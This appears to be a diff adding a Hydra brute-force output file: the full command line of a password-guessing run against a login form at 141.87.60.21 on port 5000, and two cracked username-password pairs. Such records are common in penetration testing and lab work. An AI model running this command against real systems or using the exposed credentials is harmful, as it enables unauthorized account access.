@@ -1,0 +1,3 @@
+# Hydra v9.2 run at 2025-05-09 08:52:56 on 141.87.60.21 http-post-form (hydra -L users.txt -P pws.txt -s 5000 -t 60 -w 30 -o output.txt 141.87.60.21 http-post-form /login:username=^USER^&password=^PASS^:S=302)
+[5000][http-post-form] host: 141.87.60.21   login: Marco   password: pass
+[5000][http-post-form] host: 141.87.60.21   login: fubsi   password: 1234
